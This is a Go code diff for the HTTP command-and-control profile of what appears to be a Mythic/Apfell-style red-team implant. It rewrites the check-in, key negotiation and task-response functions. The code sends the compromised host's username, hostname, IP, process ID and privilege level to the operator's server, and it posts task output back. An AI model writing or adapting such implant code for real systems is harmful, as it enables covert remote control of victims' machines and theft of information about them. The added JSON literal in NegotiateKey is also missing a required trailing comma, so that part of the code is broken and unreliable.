@@ -39,112 +39,23 @@ func newProfile() Profile {
 	return &C2Default{}
 }
 
-func (c C2Default) Header() string {
-	return c.HostHeader
-}
-
-func (c *C2Default) SetHeader(newHeader string) {
-	c.HostHeader = newHeader
-}
-
-func (c C2Default) URL() string {
-	if len(c.BaseURLs) == 0 {
-		return c.BaseURL
-	} else {
-		return c.getRandomBaseURL()
-	}
-}
-
-func (c *C2Default) getRandomBaseURL() string {
-	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
-}
-
-func (c *C2Default) SetURL(newURL string) {
-	c.BaseURL = newURL
-}
-
-func (c *C2Default) SetURLs(newURLs []string) {
-	c.BaseURLs = newURLs
-}
-
-func (c C2Default) SleepInterval() int {
-	return c.Interval
-}
-
-func (c *C2Default) SetSleepInterval(interval int) {
-	c.Interval = interval
-}
-
-func (c C2Default) C2Commands() []string {
-	return c.Commands
-}
-
-func (c *C2Default) SetC2Commands(commands []string) {
-	c.Commands = commands
-}
-
-func (c C2Default) XKeys() bool {
-	return c.ExchangingKeys
-}
-
-func (c *C2Default) SetXKeys(xkeys bool) {
-	c.ExchangingKeys = xkeys
-}
-
-func (c C2Default) ApfID() string {
-	return c.ApfellID
-}
-
-func (c *C2Default) SetApfellID(newApf string) {
-	c.ApfellID = newApf
-}
-
-func (c C2Default) UniqueID() string {
-	return c.UUID
-}
-
-func (c *C2Default) SetUniqueID(newID string) {
-	c.UUID = newID
-}
-
-func (c *C2Default) SetUserAgent(ua string) {
-	c.UserAgent = ua
-}
-
-func (c C2Default) GetUserAgent() string {
-	return c.UserAgent
-}
-
-func (c C2Default) AesPreSharedKey() string {
-	return c.AesPSK
-}
-
-func (c *C2Default) SetAesPreSharedKey(newKey string) {
-	c.AesPSK = newKey
-}
-
-func (c C2Default) RsaKey() *rsa.PrivateKey {
-	return c.RsaPrivateKey
-}
-
-func (c *C2Default) SetRsaKey(newKey *rsa.PrivateKey) {
-	c.RsaPrivateKey = newKey
-}
-
 //CheckIn a new agent
 func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interface{} {
 	var resp []byte
+	// Use dynamic JSON
 
-	checkin := structs.CheckInStruct{}
+	checkin := structs.Msg{"action": "checkin", "user": user, "host": host, "ip": ip, "pid": pid, "uuid": c.UUID}
+
+	/*checkin := structs.CheckInStruct{}
 	checkin.User = user
 	checkin.Host = host
 	checkin.IP = ip
 	checkin.Pid = pid
-	checkin.UUID = c.UUID
+	checkin.UUID = c.UUID*/
 	if functions.IsElevated() {
-		checkin.IntegrityLevel = 3
+		checkin["integrity_level"] = 3
 	} else {
-		checkin.IntegrityLevel = 2
+		checkin["integrity_level"] = 2
 	}
 
 	checkinMsg, _ := json.Marshal(checkin)
@@ -153,16 +64,17 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 	if c.ExchangingKeys {
 		sID := c.NegotiateKey()
 
-		endpoint := fmt.Sprintf("api/v1.3/crypto/EKE/%s", sID)
+		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 		resp = c.htmlPostData(endpoint, checkinMsg)
 
 	} else if len(c.AesPSK) != 0 {
 		// If we're using a static AES key, then just hit the aes_psk endpoint
-		endpoint := fmt.Sprintf("api/v1.3/crypto/aes_psk/%s", c.UUID)
+		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 		resp = c.htmlPostData(endpoint, checkinMsg)
 	} else {
 		// If we're not using encryption, we hit the callbacks endpoint directly
-		resp = c.htmlPostData("api/v1.3/callbacks/", checkinMsg)
+		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
+		resp = c.htmlPostData(endpoint, checkinMsg)
 		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
 	}
 
@@ -197,7 +109,7 @@ func (c *C2Default) GetTasking() interface{} {
 
 //PostResponse - Post task responses
 func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
-	urlEnding := fmt.Sprintf("api/v1.3/responses/%s", task.ID)
+	urlEnding := fmt.Sprintf("api/v%s/responses/%s", ApiVersion, task.ID)
 	return c.postRESTResponse(urlEnding, []byte(output))
 }
 
@@ -326,23 +238,25 @@ func (c *C2Default) htmlGetData(url string) []byte {
 func (c *C2Default) NegotiateKey() string {
 	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
-	c.SetRsaKey(priv)
-	initMessage := structs.EKEInit{}
-	// Assign the session ID and the base64 encoded pub key
-	initMessage.SessionID = sessionID
-	initMessage.Pub = base64.StdEncoding.EncodeToString(pub)
+	c.RsaPrivateKey = priv
+	// Replace struct with dynamic json
+	initMessage := structs.Msg{
+		"action": "staging_rsa",
+		"SESSIONID": sessionID,
+		"PUB": base64.StdEncoding.EncodeToString(pub)
+	}
 
 	// Encode and encrypt the json message
-	unencryptedMsg, err := json.Marshal(initMessage)
+	rawMsg, err := json.Marshal(initMessage)
 
 	if err != nil {
 		return ""
 	}
 
 	// Send the request to the EKE endpoint
-	urlSuffix := fmt.Sprintf("api/v1.3/crypto/EKE/%s", c.UUID)
+	endpoint := fmt.Sprintf("api/v%s/crypto/EKE/%s", ApiVersion, c.UUID)
 
-	resp := c.htmlPostData(urlSuffix, unencryptedMsg)
+	resp := c.htmlPostData(endpoint, rawMsg)
 	// Decrypt & Unmarshal the response
 
 	decResp, _ := base64.StdEncoding.DecodeString(string(resp))
